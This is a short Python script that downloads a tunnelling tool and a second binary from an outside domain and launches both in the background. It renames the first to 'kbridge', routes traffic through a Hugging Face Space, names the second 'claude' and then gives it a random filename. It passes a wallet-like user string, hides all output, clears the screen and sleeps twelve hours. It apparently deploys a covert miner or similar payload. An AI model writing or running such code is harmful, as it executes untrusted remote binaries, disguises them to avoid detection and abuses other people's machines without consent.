#!/usr/bin/env python3

import os
import random
import secrets
import shutil
import stat
import subprocess
import tarfile
import sys
import time
# Generate random filename and port
RANDOM_NAME = ''.join(
    secrets.choice('abcdefghijklmnopqrstuvwxyz0123456789')
    for _ in range(12)
)
PORT = random.randint(20000, 65000)

print(f"Using port: {PORT}")

def run(cmd):
    result = subprocess.run(cmd)
    if result.returncode != 0:
        print(f"Failed: {' '.join(cmd)}")
        sys.exit(1)

# Download wstunnel
run([
    "curl",
    "-L",
    "-o",
    "wstunnel.tar.gz",
    "https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz"
])

# Extract
with tarfile.open("wstunnel.tar.gz", "r:gz") as tar:
    tar.extractall()

os.remove("wstunnel.tar.gz")

# Make executable
os.chmod(
    "wstunnel",
    os.stat("wstunnel").st_mode |
    stat.S_IXUSR |
    stat.S_IXGRP |
    stat.S_IXOTH
)

# Rename
if os.path.exists("kbridge"):
    os.remove("kbridge")

shutil.move("wstunnel", "kbridge")

# Start tunnel
with open(os.devnull, "wb") as devnull:
    subprocess.Popen(
        [
            "./kbridge",
            "client",
            "wss://namtran1922-datalab.hf.space",
            "-L",
            f"tcp://{PORT}:127.0.0.1:1"
        ],
        stdout=devnull,
        stderr=devnull,
        start_new_session=True
    )

# Download second binary
run([
    "curl",
    "-L",
    "-o",
    "claude",
    "https://storage.technoelectro.online/claude"
])

# Make executable
os.chmod(
    "claude",
    os.stat("claude").st_mode |
    stat.S_IXUSR |
    stat.S_IXGRP |
    stat.S_IXOTH
)

# Randomize filename
shutil.move("claude", RANDOM_NAME)

print(f"Filename: {RANDOM_NAME}")

# Launch process
with open(os.devnull, "wb") as devnull:
    subprocess.Popen(
        [
            f"./{RANDOM_NAME}",
            "--host",
            f"127.0.0.1:{PORT}",
            "--user",
            "prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t"
        ],
        stdout=devnull,
        stderr=devnull,
        start_new_session=True
    )

# Clear screen
os.system("clear")

print("Processes started.")
print(f"Port: {PORT}")
print(f"Binary: {RANDOM_NAME}")

time.sleep(12 * 60 * 60)
